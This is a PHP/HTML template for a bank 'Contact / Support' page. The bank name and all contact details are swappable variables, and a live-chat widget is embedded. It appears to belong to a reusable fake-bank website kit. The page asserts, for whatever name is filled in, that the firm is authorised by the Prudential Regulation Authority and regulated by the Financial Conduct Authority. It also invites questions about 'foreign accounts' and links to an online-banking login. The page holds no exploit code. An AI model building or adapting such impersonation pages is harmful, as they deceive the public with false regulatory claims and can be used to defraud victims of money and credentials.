<?php include "short.php"   ?>
<!DOCTYPE html>

<html lang="en"
    class=" js  js flexbox canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths"
    style="">

    <head class="at-element-marker">
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title><?php echo $name; ?> Servicing - Support</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0,user-scalable=no">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="black">
        <link href="./contact_files/jquery-ui.css" rel="stylesheet">
        <link href="./contact_files/main.css" rel="stylesheet">
        <link href="./contact_files/print.css" rel="stylesheet">
        <link href="./contact_files/responsive.css" rel="stylesheet">

        <link rel="shortcut icon" href="./favicon.ico">
    </head>

    <body class="bg-container">





        <div id="uber-wrapper" class="dashboard bg-container" style="left: 0px;">
            <div class="container box-shadow">



                <header>
                    <div class="logo desktop-logo" title="<?php echo $name; ?>"></div>
                    <div class="logo mobile-logo" title="<?php echo $name; ?>"></div>

                    <a href="#" class="mobile-side-menu-trigger" alt="Toggle navigation menu"
                        title="Toggle navigation menu" tabindex="1" aria-labelledby="Toggle navigation menu"
                        style="visibility: hidden;">
                        <i class="icon-reorder icon-3x icon-black" aria-labelledby="Toggle navigation menu">
                        </i>
                    </a>

                </header>



            </div>
            <div class="main-wrapper" role="main">



                <nav>
                    <div class="nav-top box-shadow">
                        <h1 id="pageTitle">Contact / Support</h1>
                    </div>
                </nav>

                <div class="container">

                    <article>
                        <section class="box-shadow">







                            <div class="grid-column8 prelogin" data-behaviour="disableBack">


                                <div class="nav-breadcrumb breadcrumb-two">
                                    <div class="steps">
                                        <img src="./img/247.png" height="50px" alt="Step1"><br>
                                        <span tabindex="0">24/7 Customer Support</span>
                                    </div>

                                </div>

                                <div class="sub-header-divider"></div>

                                <section>
                                    <fieldset class="signin-container no-green-tick">
                                        <legend>Contact Information</legend>

                                        <p class="pull-left remember-me-cookie">
                                            Do you have any pending issues, questions or complaints concerning your
                                            foreign accounts?

                                            <strong>
                                                <span>Contact our Head Office immediately on:&nbsp;</span>
                                            </strong>
                                        </p>
                                        <p class="pull-left remember-me-cookie">
                                            <strong> Address:</strong> <span>
                                                <?php echo $addr; ?>
                                            </span>
                                        </p>
                                        <p class="pull-left remember-me-cookie">
                                            <strong> Phone:</strong> <span><?php echo $phone; ?></span>
                                        </p>
                                        <p class="pull-left remember-me-cookie">
                                            <strong> Fax:</strong> &nbsp;&nbsp;&nbsp; <span><?php echo $phone2; ?>
                                            </span>
                                        </p>
                                        <p class="pull-left remember-me-cookie">
                                            <strong> Email:</strong> <span><?php echo $email; ?></span>
                                        </p>
                                        <p> <strong>
                                                <span>Our Live Chat Customer Support team is always available to give
                                                    reponses to your queries.&nbsp;</span>
                                            </strong></p>
                                    </fieldset>
                                </section>


                            </div>

                            <style type="text/css">
                            a:hover {
                                text-decoration: underline;
                            }
                            </style>






                            <aside class="grid-column4 account-sidebar prelogin ">
                                <h2 class="underline">Quick Links</h2>
                                <ul class="nav-links">
                                    <li>
                                        <a href="./access" target="_blank">
                                            Login to Online Banking
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./index.php" target="_blank">
                                            Home
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./loan.php" target="_blank">
                                            Loans
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./card.php" target="_blank">
                                            Credit Cards
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./savings.php" target="_blank">
                                            Savings
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./insure.php" target="_blank">
                                            Insurance
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./travel.php" target="_blank">
                                            Travel
                                        </a>
                                    </li>
                                    <li>
                                        <a href="./index.php" target="_blank">
                                            Home
                                        </a>
                                    </li>
                                </ul>

                            </aside>
                        </section>

                    </article>
                </div>
            </div>

            <div class="container box-shadow">





                <footer>
                    <p class="copyright"><?php echo $name; ?> plc is authorised by the Prudential Regulation
                        Authority and regulated by the Financial Conduct Authority and the Prudential Regulation
                        Authority.<br>**Telephone calls may be recorded for security purposes and monitored under our
                        quality control procedures. Calls are free from a landline and from a mobile when calling from
                        the UK.</p>
                </footer>


            </div>
        </div>






        <div class="mobile-sidebar" style="right: 0px;">
            <div class="scroll-area">
                <ul class="mobile-side-menu" data-behaviour="mobileSideMenu">

                    <li><a class="" href="https://#/servicing/servicing/signin"><i
                                class="icon-fixed-width icon-signin icon-2x"></i>Log in</a></li>
                    <li><a class="" href="https://#/servicing/servicing/register"><i
                                class="icon-fixed-width icon-pencil icon-2x"></i>Registration</a></li>
                </ul>
            </div>
        </div>

        <script>
        function ClearActiveMenu() {
            var $ulParent = $('#lnkHelp').parent().parent('ul');
            $ulParent.find('a.active').removeClass('active');
        }

        function SelfCertifyOpen() {
            var popupId = '#self-certify',
                $popup = $(popupId);
            if ($popup.is(':hidden')) {
                wrapPopup(true);
                $.magnificPopup.open({
                    items: {
                        src: popupId,
                    },
                    type: 'inline',
                    callbacks: {
                        close: function() {
                            wrapPopup(false);
                        }
                    },
                    closeOnBgClick: false
                }, 0);
                $popup.removeClass('hide').find('.collapsible').show();
                return false;
            } else {
                return false;
            }
        }

        var wrapPopup = function(wrapit) {
            var $wrapinform = $('#saveapp');
            if (wrapit) {
                if (!$wrapinform.parent().is('form')) {
                    $wrapinform.wrap('<form></form>');
                }
            } else {
                if ($wrapinform.parent().is('form')) {
                    $wrapinform.unwrap();
                }
            }
        };
        </script>





        <script src="./contact_files/plugins.js.download"></script>
        <script src="./contact_files/ie.validation.js.download"></script>
        <script src="./contact_files/validation.js.download"></script>
        <script src="./contact_files/product-eligibility.js.download"></script>
        <script src="./contact_files/events.js.download"></script>
        <script src="./contact_files/config.js.download"></script>
        <script>
        applyConfig.baseUrl = "/servicing/";
        </script>
        <script src="./contact_files/routes.js.download"></script>
        <script src="./contact_files/uifunctions.js.download"></script>
        <script src="./contact_files/servicing.js.download"></script>
        <script src="./contact_files/jquery.iframeResizer.min.js.download"></script>
        <script>
        var iframeLoadCheckTimer = window.setInterval(function() {
            var $parents = $(".iframe-parent");
            $parents.each(function() {
                if ($(this).height() != $(this).find('iframe[data-resize="auto"]').height()) {
                    $(this).height($(this).find('iframe[data-resize="auto"]').height());
                }
            });

        }, 32);

        $(window).resize(function() {
            var $parents = $(".iframe-parent");
            $parents.each(function() {
                $(this).height($(this).find('iframe[data-resize="auto"]').height());
            });
            window.clearInterval(iframeLoadCheckTimer);
        });

        $('iframe[data-resize="auto"]').iFrameSizer({
            log: false,
            contentWindowBodyMargin: 0,
            doHeight: true,
            doWidth: false,
            interval: 32,
            enablePublicMethods: true
        });
        </script>




    </body>

</html>
<!--Start of Tawk.to Script-->
<script type="text/javascript">
var Tawk_API = Tawk_API || {},
    Tawk_LoadStart = new Date();
(function() {
    var s1 = document.createElement("script"),
        s0 = document.getElementsByTagName("script")[0];
    s1.async = true;
    s1.src = 'https://embed.tawk.to/5e7ea37c69e9320caabdd13c/default';
    s1.charset = 'UTF-8';
    s1.setAttribute('crossorigin', '*');
    s0.parentNode.insertBefore(s1, s0);
})();
</script>
<!--End of Tawk.to Script-->